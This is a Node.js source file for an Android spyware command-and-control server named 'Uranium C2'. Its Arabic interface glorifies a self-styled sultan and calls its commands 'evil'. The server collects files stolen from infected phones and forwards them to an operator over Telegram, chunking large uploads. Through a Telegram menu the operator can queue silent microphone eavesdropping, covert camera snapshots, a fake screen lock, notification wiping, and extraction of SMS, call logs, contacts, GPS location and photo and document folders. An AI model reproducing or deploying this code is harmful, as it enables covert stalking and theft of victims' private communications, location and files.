// =========================================================================
// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium C2 Server v15.0 [Ultimate Singularity]
// =========================================================================
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;

if (!token || !chatId) {
    console.error('[-] Critical Error: Telegram credentials missing.');
    process.exit(1);
}

const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core_v15.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
});

const app = express();
const appBot = new telegramBot(token, { polling: true });

appBot.on('polling_error', (error) => {
    if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
        console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
    }
});

app.use(express.text({ type: 'application/json', limit: '100mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '200mb' }));

async function sendTg(msg, options = {}) {
    try {
        return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
    } catch (e) {
        console.error('TG Error:', e.message);
    }
}

async function sendTgDocumentSmart(filePath, caption) {
    if (!fs.existsSync(filePath)) return;
    const stats = fs.statSync(filePath);
    const fileSizeMB = stats.size / (1024 * 1024);
    const CHUNK_LIMIT = 45 * 1024 * 1024;

    if (stats.size <= CHUNK_LIMIT) {
        try {
            await appBot.sendDocument(chatId, filePath, { caption: `${caption}\n⚔️ [تنفيذ وإشراف السلطان ناصر دين الله الكلعي]` });
        } catch (e) {
            await sendTg(`⚠️ فشل إرسال الملف مباشرة، تم حفظه محلياً في <code>uranium_storage/${path.basename(filePath)}</code> (${fileSizeMB.toFixed(2)} MB).`);
        }
    } else {
        try {
            await sendTg(`📦 الملف <b>${path.basename(filePath)}</b> ضخم (${fileSizeMB.toFixed(2)} MB). جاري تقسيمه وإرساله بأمر السلطان...`);
        } catch (e) {}
        const fd = fs.openSync(filePath, 'r');
        const buffer = Buffer.allocate(CHUNK_LIMIT);
        let partNum = 1;
        let bytesRead;

        while ((bytesRead = fs.readSync(fd, buffer, 0, CHUNK_LIMIT, null)) > 0) {
            const partPath = `${filePath}.part${String(partNum).padStart(3, '0')}`;
            fs.writeFileSync(partPath, buffer.slice(0, bytesRead));
            try {
                await appBot.sendDocument(chatId, partPath, { caption: `${caption} - الجزء (${partNum})\n⚔️ [مملكة ناصر دين الله الكلعي]` });
            } catch (err) {}
            try { fs.unlinkSync(partPath); } catch (e) {}
            partNum++;
        }
        fs.closeSync(fd);
    }
}

app.get('/', (req, res) => {
    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM C2 v15.0 [ULTIMATE SINGULARITY] ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
});

app.post('/api/v3/uranium/upload_raw', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';
        const fileName = req.headers['x-file-name'] || `uranium_archive_${Date.now()}.zip`;

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);

        if (!req.body || !Buffer.isBuffer(req.body)) {
            return res.status(400).json({ status: 'BAD_BINARY_PAYLOAD' });
        }

        const safeName = path.basename(fileName);
        const controllerFilePath = path.join(STORAGE_DIR, `${nodeId}_${Date.now()}_${safeName}`);
        fs.writeFileSync(controllerFilePath, req.body);

        const stats = fs.statSync(controllerFilePath);
        const fileSizeMB = stats.size / (1024 * 1024);

        await sendTg(`☢️ <b>حصاد الأشرار الحقيقي في خزنتك المركزية:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
        await sendTgDocumentSmart(controllerFilePath, `☠️ أرشيف التفرد: <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);

        res.status(200).json({ status: 'OK', message: 'SAVED_AND_FORWARDED' });
    } catch (e) {
        console.error('Upload Error:', e);
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

app.post('/api/v3/uranium/stream', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
        
        let payload;
        try {
            payload = JSON.parse(req.body);
        } catch (err) {
            return res.status(400).json({ status: 'BAD_PAYLOAD', error: err.message });
        }

        let directive = { status: 'ACK', task: null };

        if (payload.type === 'TEXT_REPORT') {
            const textData = payload.data || '';
            if (textData.length > 2) {
                await sendTg(`☢ <b>تقرير العقدة [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3800)}</pre>`);
            }
        }

        db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
            if (row) {
                directive.task = { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') };
                db.run(`UPDATE tasks SET status = 'SENT' WHERE id = ?`, [row.id]);
            }
            res.status(200).json(directive);
        });
    } catch (e) {
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(chatId)) return;
    const text = msg.text;

    if (text === '/start') {
        db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
            if (!rows || rows.length === 0) {
                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً.</b>\n(تنفيذ بأمر السلطان ناصر دين الله الكلعي)`);
                return;
            }

            let inlineKeyboard = [];
            rows.forEach(node => {
                inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
            });

            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - منصة التفرد v15.0:</b>\nاختر العقدة للسيطرة المطلقة:`, {
                reply_markup: { inline_keyboard: inlineKeyboard }
            });
        });
    }
});

appBot.on('callback_query', async (query) => {
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🎙️ تنصت صوتي صامت (Micro-Audio)', callback_data: `cmd_MIC_LISTEN_${nodeId}` },
                    { text: '📸 لقطة بصرية فورية (Micro-Snap)', callback_data: `cmd_MICRO_SNAPSHOT_${nodeId}` }
                ],
                [
                    { text: '🔒 قفل وهمي للشاشة (Dummy Blackout)', callback_data: `cmd_DUMMY_LOCK_${nodeId}` },
                    { text: '🧹 مسح الإشعارات بصمت', callback_data: `cmd_PURGE_NOTIFICATIONS_${nodeId}` }
                ],
                [
                    { text: '📳 اهتزاز مرعب', callback_data: `cmd_VIBRATE_DEVICE_${nodeId}` },
                    { text: '🔦 تشغيل الكشاف الفلاش', callback_data: `cmd_FLASH_ON_${nodeId}` }
                ],
                [
                    { text: '📶 طيار آلي للـ Wi-Fi (توفير الباقة)', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` },
                    { text: '📊 فحص التخزين الصامت', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }
                ],
                [
                    { text: '📁 معالجة DCIM', callback_data: `cmd_PROC_DCIM_${nodeId}` },
                    { text: '📥 معالجة Download', callback_data: `cmd_PROC_DOWNLOAD_${nodeId}` }
                ],
                [
                    { text: '🖼️ معالجة Pictures', callback_data: `cmd_PROC_PICTURES_${nodeId}` },
                    { text: '📄 معالجة Documents', callback_data: `cmd_PROC_DOCUMENTS_${nodeId}` }
                ],
                [
                    { text: '📨 الرسائل SMS', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
                    { text: '📞 المكالمات', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
                ],
                [
                    { text: '📇 الجهات', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
                    { text: '📍 الموقع GPS', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }
                ],
                [{ text: '🔙 القائمة الرئيسية', callback_data: 'back_home' }]
            ]
        };
        await appBot.editMessageText(`🎯 <b>العقدة تحت سيطرة ملك الأشرار السلطان:</b> <code>${nodeId}</code>\nاختر الأوامر الأسطورية والشريرة المتقدمة:`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    } else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');

        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر الشرير [${action}] بنجاح!` });
            await sendTg(`⚡ <b>أمر الأشرار [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
        });
    } else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id);
        await sendTg(`أرسل <code>/start</code> لإظهار قائمة عقد اليورانيوم النشطة.`);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium C2 Server v15.0 [Ultimate Singularity] Online on port ${PORT} (ناصر دين الله الكلعي)`));
